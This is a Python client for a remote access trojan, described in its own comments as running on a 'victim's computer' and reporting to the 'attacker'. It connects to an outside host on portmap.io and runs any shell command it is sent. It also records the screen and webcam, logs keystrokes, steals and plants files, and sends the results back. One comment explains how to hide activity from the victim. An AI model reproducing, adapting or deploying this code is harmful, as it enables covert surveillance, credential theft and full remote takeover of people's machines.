# Client file will run on client/victim's computer
# Functions:-
# 1. It will try to connect to server and wait for commands
# 2. Recieve the commands and execute them on victim's computer
# 3. Return output to server(attacker)

import socket # module help us to create sockets that act as end-point for 2-way communication between 2 processes over a network
import os # module that helps to execute instructions recieved from server,it provides functions for interacting with OS
import subprocess # module that helps to spawn new processes and attach to their input,output and error pipeline
import sys  # helps us to execute terminal commands
import pyautogui
import numpy as np 
import cv2
import pyscreenshot as ImageGrab
from pynput.keyboard import Listener,Key 
import platform

count=0 # to store count of keys logged

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine

host="Kartik0312-21108.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
port=21108  # it will store port number on which server is listening

s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
                       # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
                       # A socket is opened at an ephemeral port on victim machine that is a random port number between 49153-65535 assigned by OS 


# to record screen
def capture_screen():
    SCREEN_SIZE=pyautogui.size()

    fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file

    out=cv2.VideoWriter("output.avi",fourcc,20.0,SCREEN_SIZE)
    for i in range(120):

        img=pyautogui.screenshot()
        frame=np.array(img)

        frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
        out.write(frame)


    out.release()
    cv2.destroyAllWindows()

# to record webcam feed
def capture_webcam():
    vid=cv2.VideoCapture(0,cv2.CAP_DSHOW)  # to remove warning changing backend to CAP_DSHOW
    fourcc=cv2.VideoWriter_fourcc(*'XVID')  # video codec library to write video file
    width = int(vid.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(vid.get(cv2.CAP_PROP_FRAME_HEIGHT))
    out=cv2.VideoWriter("webcam.avi",fourcc,20.0,(width,height))

    for i in range(120):
        ret,frame=vid.read()
        if ret == True:
            frame=cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
            out.write(frame)
    vid.release()
    out.release()
    cv2.destroyAllWindows()

# keylogger code
def capture_keys():

    def on_press(key):
        global count
        count+=1
        with open("log.txt","a") as f:
            key=str(key).replace("Key.","")
            key=key.replace("'","")
            f.write(key)


    def on_release(key):
        global count 
        if key == Key.esc or count > 50:
            count=0
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()




while True:  # An infinite loop to execute multiple commands recieved from server
    try:
        data=s.recv(20480) # recieving data in form of bytes from server(1024 B chunk)
        
        if data[:].decode() == 'exit':
            raise Exception("")
        
        if data[:].decode() == "sysinfo":
            my_system = platform.uname()
 
            output=f"System: {my_system.system}\n"+f"Node Name: {my_system.node}\n"+f"Release: {my_system.release}\n"+f"Version: {my_system.version}\n"+f"Machine: {my_system.machine}\n"+f"Processor: {my_system.processor}\n"
            output+= os.getcwd() + "> "
            s.send(output.encode())
            continue

        if data[:].decode() == "webcam":
            s.send("capturing_webcam".encode())
            s.recv(2048)
            try:
                capture_webcam()
                f=open("webcam.avi","rb")
                data=f.read()

                l=len(data)
                s.send(str(l).encode())

                response=s.recv(20480)
                s.send(data)
                fin = s.recv(1024)

                f.close()
                os.remove("webcam.avi")
            except:
                s.send('0'.encode())
                s.recv(1024)

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue            

        if data[:].decode() == "rec":
            s.send("capturing".encode())

            capture_screen()
            f=open("output.avi","rb")
            data=f.read()

            l=len(data)
            s.send(str(l).encode())

            response=s.recv(20480)
            s.send(data)
            fin = s.recv(1024)

            f.close()
            os.remove("output.avi")

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue

        if data[:].decode("utf-8").split(" ")[0] == "getfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            filename=os.path.basename(filepath)
            s.send("sending_file".encode())
            s.recv(2048)
            try:
                f=open(filepath,"rb")
                data=f.read()
                l=len(data)
                s.send(str(l).encode())
                s.recv(1024)
                s.send(data)
                s.recv(1024)
                f.close()

            except:
                s.send("0".encode())
                s.recv(1024)

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue

        if data[:].decode("utf-8").split(" ")[0] == "sendfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            s.send("receiving_file".encode())
            filename=os.path.basename(filepath)
            l=int(s.recv(20480).decode())

            if l==0:
                pass        

            else:
                f=open(filename,"wb")
                s.send("start".encode())
                curr_len=0
                while curr_len<l:
                    data=s.recv(204800)
                    curr_len+=len(data)
                    f.write(data)
                    s.send(str(curr_len).encode())

                s.recv(1024)
                f.close()

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue


        if data[:].decode() == "ss":
            s.send("clicking".encode())
            im=ImageGrab.grab()
            im.save("screenshot.jpg")
            f=open("screenshot.jpg","rb")
            data=f.read()

            l=len(data)
            s.send(str(l).encode())

            response=s.recv(20480)
            s.send(data)
            fin=s.recv(1024)

            f.close()
            os.remove("screenshot.jpg")

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue

        if data[:].decode() == "keylogger":
            s.send("Logging_keys".encode())
            s.recv(1024)
            capture_keys()
            s.send("done".encode())
            s.recv(1024)
            f=open("log.txt","rb")
            data=f.read()
            l=len(data)
            s.send(str(l).encode())
            s.recv(1024)
            s.send(data)
            s.recv(1024)
            f.close()
            os.remove("log.txt")
            output=os.getcwd()+"> "
            s.send(output.encode())
            continue



        if data[:2].decode("utf-8") == "cd":   # handling for cd command which dont generate output and just switches between directories
            path=data[3:].decode("utf-8")      # new directory path
            os.chdir(path)                     # change current working directory

        if len(data) > 0:    # to check whether any data has been entered by attacker or not
            
            cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,stderr=subprocess.PIPE)   
                                                                       # subprocess.Popen() creates a new child process
                                                                       # if shell=True then it selects command prompt(shell) as program to execute commands and also help us to execute shell commands
                                                                       # if we only want to run batch file or executable then shell=False works but if we want to execute shell commands such as (copy or dir) then shell=True must be pecified
                                                                       # command passed as arguement is then executed on the shell
                                                                       # stdout,str=din,stderr are standard ouput,input and error to newly created process
                                                                       # subprocess.PIPE reprsents a new pipeline for child process to be created

            output_byte=cmd.stdout.read() + cmd.stderr.read()    # output of command executed in form of bytes

            output_string=str(output_byte,"utf-8")   # output string conatining output of executed command that is to be sent back to server(attacker)
            
            current_dir=os.getcwd() + "> "        # we will also send current working directory to the server for reflecting changes for cd commands
            
            s.send(str.encode(output_string+current_dir))        # output string along with current working directory needs to be encoded for transmission

            print(output_string+current_dir)                 # printing output on client/victim- can be omitted for attacking purpose if we dont want victim to know of commands we are executing
                 
            cmd.terminate()                      # terminating child process after each command
    except Exception as e:
        print("Connection has been closed by server!!!")
        s.close()
        break
